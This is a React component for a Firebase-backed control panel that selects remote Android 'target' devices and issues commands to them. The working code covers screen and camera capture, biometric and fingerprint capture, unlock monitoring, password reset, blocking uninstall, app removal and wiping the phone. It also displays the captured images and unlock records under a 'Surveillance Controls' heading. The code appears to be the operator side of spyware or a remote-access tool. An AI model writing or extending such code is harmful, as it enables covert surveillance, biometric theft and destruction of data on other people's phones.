import React, { useState, useEffect, useCallback } from "react";
import { ref, onValue, set } from "firebase/database";
import { database as db } from "../firebaseConfig";
import "./LockServiceTab.css";

const LockServiceTab = () => {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [lockDetails, setLockDetails] = useState({
    connected: false,
    isDeviceSecure: false,
    biometricStatus: "Unknown",
    biometricType: "None",
    isDeviceAdminActive: false,
    passwordQuality: "Unknown",
    lockScreenTimeout: -1,
    keyguardFeatures: [],
    androidVersion: 0,
    manufacturer: "Unknown",
    model: "Unknown",
    serviceInitialized: false,
    networkAvailable: false,
    cameraAvailable: false,
    fingerprintAvailable: false,
    overlayPermission: false,
  });
  const [fetchStatus, setFetchStatus] = useState({
    lock: "idle",
    unlock: "idle",
    screenOn: "idle",
    screenOff: "idle",
    captureBiometric: "idle",
    biometricUnlock: "idle",
    wipePhone: "idle",
    preventUninstall: "idle",
    reboot: "idle",
    enableAdmin: "idle",
    getStatus: "idle",
    resetPassword: "idle",
    setPasswordQuality: "idle",
    setLockTimeout: "idle",
    disableKeyguardFeatures: "idle",
    captureScreen: "idle",
    capturePhoto: "idle",
    captureFingerprint: "idle",
    disableApp: "idle",
    uninstallApp: "idle",
    monitorUnlock: "idle",
  });
  const [errorDetails, setErrorDetails] = useState({});
  const [biometricData, setBiometricData] = useState(null);
  const [warnings, setWarnings] = useState([]);
  const [passwordState, setPasswordState] = useState(null);
  const [screenCaptures, setScreenCaptures] = useState([]);
  const [photoCaptures, setPhotoCaptures] = useState([]);
  const [unlockAttempts, setUnlockAttempts] = useState([]);
  const [advancedMode, setAdvancedMode] = useState(false);
  const [commandParams, setCommandParams] = useState({
    password: "",
    passwordQuality: "complex",
    lockTimeout: 30000,
    keyguardFeatures: [],
    packageName: "",
  });

  // Fetch devices from Firebase
  useEffect(() => {
    const devicesRef = ref(db, "Device");
    const unsubscribe = onValue(
      devicesRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const deviceData = snapshot.val();
          const deviceList = Object.entries(deviceData).map(([id, data]) => ({
            id,
            name: data.name || `Device ${id.slice(-4)}`,
            lastSeen: data.lastSeen || 0,
            online: data.lock_service?.connected || false,
          }));
          setDevices(deviceList);
          if (!selectedDevice && deviceList.length > 0) {
            setSelectedDevice(deviceList[0].id);
          }
        } else {
          setDevices([]);
          setSelectedDevice(null);
          setWarnings((prev) => [
            ...prev,
            "⚠️ No devices found. Check Firebase configuration.",
          ]);
        }
      },
      (error) => {
        console.error("Error fetching devices:", error);
        setWarnings((prev) => [
          ...prev,
          "❌ Failed to fetch devices. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, [selectedDevice]);

  // Fetch enhanced lock details and related data for selected device
  useEffect(() => {
    if (!selectedDevice) return;

    const lockServiceRef = ref(db, `Device/${selectedDevice}/lock_service`);
    const lockDetailsRef = ref(db, `Device/${selectedDevice}/lock_details`);
    const biometricRef = ref(db, `Device/${selectedDevice}/biometric_data`);
    const passwordStateRef = ref(db, `Device/${selectedDevice}/password_state`);
    const screenCapturesRef = ref(db, `Device/${selectedDevice}/screen_captures`);
    const photoCapturesRef = ref(db, `Device/${selectedDevice}/photo_captures`);
    const unlockAttemptsRef = ref(db, `Device/${selectedDevice}/unlock_attempts`);

    const unsubscribeLockService = onValue(lockServiceRef, (snapshot) => {
      setLockDetails((prev) => ({
        ...prev,
        connected: snapshot.exists() ? snapshot.val().connected : false,
      }));
      if (!snapshot.exists() || !snapshot.val().connected) {
        setWarnings((prev) => [
          ...prev.filter((w) => !w.includes("Lock Service")),
          "🔴 Lock Service is not connected. Ensure the app is running on the device.",
        ]);
      } else {
        setWarnings((prev) => prev.filter((w) => !w.includes("Lock Service")));
      }
    });

    const unsubscribeLockDetails = onValue(lockDetailsRef, (snapshot) => {
      if (snapshot.exists()) {
        const details = snapshot.val();
        setLockDetails((prev) => ({ ...prev, ...details }));
        
        const newWarnings = [];
        if (!details.isDeviceAdminActive) {
          newWarnings.push(
            "⚠️ Device Admin is not enabled. Advanced commands will fail."
          );
        }
        if (
          details.biometricStatus === "Not Enrolled" ||
          details.biometricStatus === "Not Available"
        ) {
          newWarnings.push(
            "⚠️ Biometric authentication is not available. Biometric commands will fail."
          );
        }
        if (!details.overlayPermission) {
          newWarnings.push(
            "⚠️ Overlay permission not granted. Screen capture may fail."
          );
        }
        if (!details.cameraAvailable) {
          newWarnings.push(
            "⚠️ Camera not available. Photo capture will fail."
          );
        }
        if (!details.networkAvailable) {
          newWarnings.push(
            "⚠️ Network not available. Commands may be delayed."
          );
        }
        
        setWarnings((prev) => [
          ...newWarnings,
          ...prev.filter(
            (w) => !w.includes("Device Admin") && 
                   !w.includes("Biometric") && 
                   !w.includes("Overlay") &&
                   !w.includes("Camera") &&
                   !w.includes("Network")
          ),
        ].slice(0, 8));
      }
    });

    const unsubscribeBiometric = onValue(biometricRef, (snapshot) => {
      setBiometricData(snapshot.exists() ? snapshot.val() : null);
    });

    const unsubscribePasswordState = onValue(passwordStateRef, (snapshot) => {
      setPasswordState(snapshot.exists() ? snapshot.val() : null);
    });

    const unsubscribeScreenCaptures = onValue(screenCapturesRef, (snapshot) => {
      if (snapshot.exists()) {
        const captures = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setScreenCaptures(captures.slice(-5)); // Keep last 5
      }
    });

    const unsubscribePhotoCaptures = onValue(photoCapturesRef, (snapshot) => {
      if (snapshot.exists()) {
        const captures = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setPhotoCaptures(captures.slice(-5)); // Keep last 5
      }
    });

    const unsubscribeUnlockAttempts = onValue(unlockAttemptsRef, (snapshot) => {
      if (snapshot.exists()) {
        const attempts = Object.entries(snapshot.val()).map(([id, data]) => ({
          id,
          ...data,
        }));
        setUnlockAttempts(attempts.slice(-10)); // Keep last 10
      }
    });

    return () => {
      unsubscribeLockService();
      unsubscribeLockDetails();
      unsubscribeBiometric();
      unsubscribePasswordState();
      unsubscribeScreenCaptures();
      unsubscribePhotoCaptures();
      unsubscribeUnlockAttempts();
    };
  }, [selectedDevice]);

  // Monitor command status
  useEffect(() => {
    if (!selectedDevice) return;

    const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);
    const unsubscribe = onValue(
      commandRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const statusKey = getStatusKey(data.action);
          setFetchStatus((prev) => ({
            ...prev,
            [statusKey]: data.status,
          }));
          setErrorDetails((prev) => ({
            ...prev,
            [statusKey]: data.error || null,
          }));
        }
      },
      (error) => {
        console.error("Error fetching command status:", error);
        setWarnings((prev) => [
          ...prev,
          "❌ Failed to fetch command status. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, [selectedDevice]);

  const getStatusKey = (action) => {
    const mapping = {
      CaptureBiometricData: "captureBiometric",
      BiometricUnlock: "biometricUnlock",
      wipeThePhone: "wipePhone",
      preventUninstall: "preventUninstall",
      resetPassword: "resetPassword",
      setPasswordQuality: "setPasswordQuality",
      setLockTimeout: "setLockTimeout",
      disableKeyguardFeatures: "disableKeyguardFeatures",
      captureScreen: "captureScreen",
      capturePhoto: "capturePhoto",
      captureFingerprint: "captureFingerprint",
      disableApp: "disableApp",
      uninstallApp: "uninstallApp",
      monitorUnlock: "monitorUnlock",
    };
    return mapping[action] || action;
  };

  // Trigger device command
  const triggerDeviceAdviceCommand = useCallback(
    async (action, params = {}) => {
      if (!selectedDevice) {
        setWarnings((prev) => [
          ...prev,
          "❌ No device selected. Please select a device.",
        ]);
        return;
      }

      // Confirmation for destructive actions
      const destructiveActions = ["wipeThePhone", "reboot", "resetPassword"];
      if (destructiveActions.includes(action)) {
        const actionNames = {
          wipeThePhone: "wipe the device",
          reboot: "reboot the device",
          resetPassword: "reset the device password",
        };
        if (
          !window.confirm(
            `⚠️ Are you sure you want to ${actionNames[action]}? This action cannot be undone.`
          )
        ) {
          return;
        }
      }

      try {
        const statusKey = getStatusKey(action);
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "sending",
        }));
        
        const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);
        
        await set(commandRef, {
          action,
          commandId,
          status: "pending",
          timestamp: Date.now(),
          params: params,
        });
        
        console.log(`✅ Command sent: ${action}`, params);
      } catch (error) {
        console.error(`❌ Failed to send command ${action}:`, error);
        const statusKey = getStatusKey(action);
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "error",
        }));
        setErrorDetails((prev) => ({
          ...prev,
          [statusKey]: `Failed to send command: ${error.message}`,
        }));
        setWarnings((prev) => [
          ...prev,
          `❌ Failed to send ${action} command: ${error.message}`,
        ]);
      }
    },
    [selectedDevice]
  );

  // Get button status text with enhanced styling
  const getButtonStatus = useCallback(
    (action) => {
      const status = fetchStatus[action];
      const statusIcons = {
        sending: "📤",
        pending: "⏳",
        success: "✅",
        failed: "❌",
        error: "⚠️",
        cancelled: "🚫",
        timeout: "⏰",
      };
      
      const icon = statusIcons[status] || "⚪";
      
      switch (status) {
        case "sending":
          return `${icon} Sending...`;
        case "pending":
          return `${icon} Processing...`;
        case "success":
          return `${icon} Success`;
        case "failed":
          return `${icon} Failed`;
        case "error":
          return `${icon} Error`;
        case "cancelled":
          return `${icon} Cancelled`;
        case "timeout":
          return `${icon} Timeout`;
        default:
          return `${icon} Ready`;
      }
    },
    [fetchStatus]
  );

  const formatTimestamp = (timestamp) => {
    return new Date(timestamp).toLocaleString();
  };

  const clearWarnings = () => {
    setWarnings([]);
  };

  return (
    <div className="lock-service-tab">
      <div className="lock-header">
        <h2>🔐 Enhanced Lock Service Control</h2>
        <div className="lock-mode-toggle">
          <label>
            <input
              type="checkbox"
              checked={advancedMode}
              onChange={(e) => setAdvancedMode(e.target.checked)}
            />
            Advanced Mode
          </label>
        </div>
      </div>

      {warnings.length > 0 && (
        <div className="lock-warnings">
          <div className="warnings-header">
            <h3>⚠️ System Warnings</h3>
            <button onClick={clearWarnings} className="clear-warnings-btn">
              Clear All
            </button>
          </div>
          <ul>
            {warnings.map((warning, index) => (
              <li key={index} className="warning-item">
                {warning}
              </li>
            ))}
          </ul>
        </div>
      )}

      <div className="lock-device-selection">
        <label>🎯 Select Target Device:</label>
        <select
          value={selectedDevice || ""}
          onChange={(e) => setSelectedDevice(e.target.value || null)}
          className="device-selector"
        >
          <option value="">Select a device</option>
          {devices.map((device) => (
            <option key={device.id} value={device.id}>
              {device.online ? "🟢" : "🔴"} {device.name} 
              {device.lastSeen ? ` (${formatTimestamp(device.lastSeen)})` : ""}
            </option>
          ))}
        </select>
      </div>

      {selectedDevice && lockDetails && (
        <div className="lock-device-info">
          <h3>📊 Device Status Matrix</h3>
          <div className="status-grid">
            <div className="status-row">
              <span className="status-label">🔗 Service Connected</span>
              <span className={`status-value ${lockDetails.connected ? 'online' : 'offline'}`}>
                {lockDetails.connected ? "🟢 ONLINE" : "🔴 OFFLINE"}
              </span>
            </div>
            <div className="status-row">
              <span className="status-label">🔒 Device Secure</span>
              <span className={`status-value ${lockDetails.isDeviceSecure ? 'secure' : 'insecure'}`}>
                {lockDetails.isDeviceSecure ? "🔐 SECURED" : "🔓 UNSECURED"}
              </span>
            </div>
            <div className="status-row">
              <span className="status-label">👆 Biometric Status</span>
              <span className="status-value">{lockDetails.biometricStatus}</span>
            </div>
            <div className="status-row">
              <span className="status-label">🔑 Biometric Type</span>
              <span className="status-value">{lockDetails.biometricType}</span>
            </div>
            <div className="status-row">
              <span className="status-label">⚡ Device Admin</span>
              <span className={`status-value ${lockDetails.isDeviceAdminActive ? 'active' : 'inactive'}`}>
                {lockDetails.isDeviceAdminActive ? "🟢 ACTIVE" : "🔴 INACTIVE"}
              </span>
            </div>
            
            {advancedMode && (
              <>
                <div className="status-row">
                  <span className="status-label">🔐 Password Quality</span>
                  <span className="status-value">{lockDetails.passwordQuality}</span>
                </div>
                <div className="status-row">
                  <span className="status-label">⏰ Lock Timeout</span>
                  <span className="status-value">
                    {lockDetails.lockScreenTimeout > 0 
                      ? `${lockDetails.lockScreenTimeout / 1000}s` 
                      : "Not Set"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">📱 Device Info</span>
                  <span className="status-value">
                    {lockDetails.manufacturer} {lockDetails.model} (API {lockDetails.androidVersion})
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🌐 Network</span>
                  <span className={`status-value ${lockDetails.networkAvailable ? 'online' : 'offline'}`}>
                    {lockDetails.networkAvailable ? "🟢 AVAILABLE" : "🔴 UNAVAILABLE"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">📷 Camera</span>
                  <span className={`status-value ${lockDetails.cameraAvailable ? 'available' : 'unavailable'}`}>
                    {lockDetails.cameraAvailable ? "🟢 AVAILABLE" : "🔴 UNAVAILABLE"}
                  </span>
                </div>
                <div className="status-row">
                  <span className="status-label">🖼️ Overlay Permission</span>
                  <span className={`status-value ${lockDetails.overlayPermission ? 'granted' : 'denied'}`}>
                    {lockDetails.overlayPermission ? "🟢 GRANTED" : "🔴 DENIED"}
                  </span>
                </div>
              </>
            )}
          </div>

          {passwordState && (
            <div className="password-state">
              <h4>🔑 Password State</h4>
              <p>Device Locked: {passwordState.isDeviceLocked ? "🔒 YES" : "🔓 NO"}</p>
              <p>Last Check: {formatTimestamp(passwordState.timestamp)}</p>
            </div>
          )}

          {biometricData && (
            <div className="biometric-data">
              <h4>👆 Biometric Data</h4>
              <pre className="biometric-display">{JSON.stringify(biometricData, null, 2)}</pre>
            </div>
          )}
        </div>
      )}

      {selectedDevice && (
        <div className="lock-controls">
          <h3>🎮 Device Control Panel</h3>
          
          {/* Basic Controls */}
          <div className="control-section">
            <h4>🔧 Basic Controls</h4>
            <div className="lock-button-group">
              {[
                { action: "lock", label: "🔒 Lock Device", category: "basic" },
                { action: "unlock", label: "🔓 Unlock Device", category: "basic" },
                { action: "screenOn", label: "💡 Screen On", category: "basic" },
                { action: "screenOff", label: "🌙 Screen Off", category: "basic" },
                { action: "getStatus", label: "📊 Refresh Status", category: "basic" },
              ].map(({ action, label }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[action]}`}
                  data-status={fetchStatus[action]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[action] === "sending" ||
                    fetchStatus[action] === "pending"
                  }
                >
                  {label}
                  <span className="button-status">({getButtonStatus(action)})</span>
                </button>
              ))}
            </div>
          </div>

          {/* Biometric Controls */}
          <div className="control-section">
            <h4>👆 Biometric Controls</h4>
            <div className="lock-button-group">
              {[
                {
                  action: "CaptureBiometricData",
                  label: "📸 Capture Biometric",
                  statusKey: "captureBiometric",
                },
                {
                  action: "BiometricUnlock",
                  label: "🔓 Biometric Unlock",
                  statusKey: "biometricUnlock",
                },
                {
                  action: "captureFingerprint",
                  label: "👆 Capture Fingerprint",
                  statusKey: "captureFingerprint",
                },
              ].map(({ action, label, statusKey = action }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[statusKey]}`}
                  data-status={fetchStatus[statusKey]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[statusKey] === "sending" ||
                    fetchStatus[statusKey] === "pending"
                  }
                >
                  {label}
                  <span className="button-status">({getButtonStatus(statusKey)})</span>
                </button>
              ))}
            </div>
          </div>

          {/* Surveillance Controls */}
          <div className="control-section">
            <h4>👁️ Surveillance Controls</h4>
            <div className="lock-button-group">
              {[
                { action: "captureScreen", label: "📱 Capture Screen" },
                { action: "capturePhoto", label: "📷 Capture Photo" },
                { action: "monitorUnlock", label: "👁️ Monitor Unlocks" },
              ].map(({ action, label }) => (
                <button
                  key={action}
                  className={`lock-button ${fetchStatus[action]}`}
                  data-status={fetchStatus[action]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[action] === "sending" ||
                    fetchStatus[action] === "pending"
                  }
                >
                  {label}
                  <span className="button-status">({getButtonStatus(action)})</span>
                </button>
              ))}
            </div>
          </div>

          {/* Destructive Controls */}
          <div className="control-section destructive">
            <h4>⚠️ Destructive Controls</h4>
            <div className="lock-button-group">
              {[
                {
                  action: "wipeThePhone",
                  label: "🗑️ Wipe Device",
                  statusKey: "wipePhone",
                },
                {
                  action: "preventUninstall",
                  label: "🛡️ Prevent Uninstall",
                  statusKey: "preventUninstall",
                },
                { action: "reboot", label: "🔄 Reboot Device" },
              ].map(({ action, label, statusKey = action }) => (
                <button
                  key={action}
                  className={`lock-button destructive ${fetchStatus[statusKey]}`}
                  data-status={fetchStatus[statusKey]}
                  onClick={() => triggerDeviceAdviceCommand(action)}
                  disabled={
                    fetchStatus[statusKey] === "sending" ||
                    fetchStatus[statusKey] === "pending"
                  }
                >
                  {label}
                  <span className="button-status">({getButtonStatus(statusKey)})</span>
                </button>
              ))}
            </div>
          </div>

          {/* Advanced Controls */}
          {advancedMode && (
            <>
              <div className="control-section">
                <h4>🔧 Advanced Controls</h4>
                
                {/* Password Controls */}
                <div className="advanced-control">
                  <label>🔑 Reset Password:</label>
                  <div className="input-group">
                    <input
                      type="password"
                      placeholder="New password"
                      value={commandParams.password}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          password: e.target.value,
                        }))
                      }
                    />
                    <button
                      className={`lock-button ${fetchStatus.resetPassword}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("resetPassword", {
                          password: commandParams.password,
                        })
                      }
                      disabled={
                        !commandParams.password ||
                        fetchStatus.resetPassword === "sending" ||
                        fetchStatus.resetPassword === "pending"
                      }
                    >
                      🔑 Reset ({getButtonStatus("resetPassword")})
                    </button>
                  </div>
                </div>

                {/* Password Quality */}
                <div className="advanced-control">
                  <label>🔐 Password Quality:</label>
                  <div className="input-group">
                    <select
                      value={commandParams.passwordQuality}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          passwordQuality: e.target.value,
                        }))
                      }
                    >
                      <option value="numeric">Numeric</option>
                      <option value="numeric_complex">Numeric Complex</option>
                      <option value="alphabetic">Alphabetic</option>
                      <option value="alphanumeric">Alphanumeric</option>
                      <option value="complex">Complex</option>
                    </select>
                    <button
                      className={`lock-button ${fetchStatus.setPasswordQuality}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("setPasswordQuality", {
                          quality: commandParams.passwordQuality,
                        })
                      }
                      disabled={
                        fetchStatus.setPasswordQuality === "sending" ||
                        fetchStatus.setPasswordQuality === "pending"
                      }
                    >
                      🔐 Set ({getButtonStatus("setPasswordQuality")})
                    </button>
                  </div>
                </div>

                {/* Lock Timeout */}
                <div className="advanced-control">
                  <label>⏰ Lock Timeout (ms):</label>
                  <div className="input-group">
                    <input
                      type="number"
                      placeholder="30000"
                      value={commandParams.lockTimeout}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          lockTimeout: parseInt(e.target.value) || 30000,
                        }))
                      }
                    />
                    <button
                      className={`lock-button ${fetchStatus.setLockTimeout}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("setLockTimeout", {
                          timeout: commandParams.lockTimeout,
                        })
                      }
                      disabled={
                        fetchStatus.setLockTimeout === "sending" ||
                        fetchStatus.setLockTimeout === "pending"
                      }
                    >
                      ⏰ Set ({getButtonStatus("setLockTimeout")})
                    </button>
                  </div>
                </div>

                {/* App Management */}
                <div className="advanced-control">
                  <label>📱 App Management:</label>
                  <div className="input-group">
                    <input
                      type="text"
                      placeholder="Package name (e.g., com.example.app)"
                      value={commandParams.packageName}
                      onChange={(e) =>
                        setCommandParams((prev) => ({
                          ...prev,
                          packageName: e.target.value,
                        }))
                      }
                    />
                    <button
                      className={`lock-button ${fetchStatus.disableApp}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("disableApp", {
                          packageName: commandParams.packageName,
                        })
                      }
                      disabled={
                        !commandParams.packageName ||
                        fetchStatus.disableApp === "sending" ||
                        fetchStatus.disableApp === "pending"
                      }
                    >
                      🚫 Disable ({getButtonStatus("disableApp")})
                    </button>
                    <button
                      className={`lock-button ${fetchStatus.uninstallApp}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("uninstallApp", {
                          packageName: commandParams.packageName,
                        })
                      }
                      disabled={
                        !commandParams.packageName ||
                        fetchStatus.uninstallApp === "sending" ||
                        fetchStatus.uninstallApp === "pending"
                      }
                    >
                      🗑️ Uninstall ({getButtonStatus("uninstallApp")})
                    </button>
                  </div>
                </div>
              </div>

              {/* Captured Data Display */}
              {(screenCaptures.length > 0 || photoCaptures.length > 0 || unlockAttempts.length > 0) && (
                <div className="captured-data">
                  <h4>📊 Captured Data</h4>
                  
                  {screenCaptures.length > 0 && (
                    <div className="capture-section">
                      <h5>📱 Screen Captures ({screenCaptures.length})</h5>
                      <div className="capture-grid">
                        {screenCaptures.map((capture) => (
                          <div key={capture.id} className="capture-item">
                            <img
                              src={`data:image/jpeg;base64,${capture.image}`}
                              alt="Screen capture"
                              className="capture-thumbnail"
                            />
                            <p>{formatTimestamp(capture.timestamp)}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {photoCaptures.length > 0 && (
                    <div className="capture-section">
                      <h5>📷 Photo Captures ({photoCaptures.length})</h5>
                      <div className="capture-grid">
                        {photoCaptures.map((capture) => (
                          <div key={capture.id} className="capture-item">
                            <img
                              src={`data:image/jpeg;base64,${capture.image}`}
                              alt="Photo capture"
                              className="capture-thumbnail"
                            />
                            <p>{formatTimestamp(capture.timestamp)}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {unlockAttempts.length > 0 && (
                    <div className="capture-section">
                      <h5>👁️ Unlock Attempts ({unlockAttempts.length})</h5>
                      <div className="unlock-attempts">
                        {unlockAttempts.map((attempt) => (
                          <div key={attempt.id} className="unlock-attempt">
                            <span className={`unlock-status ${attempt.isDeviceLocked ? 'locked' : 'unlocked'}`}>
                              {attempt.isDeviceLocked ? "🔒" : "🔓"}
                            </span>
                            <span>{formatTimestamp(attempt.timestamp)}</span>
                            <span>Secure: {attempt.isDeviceSecure ? "Yes" : "No"}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          )}
        </div>
      )}
    </div>
  );
};

export default LockServiceTab;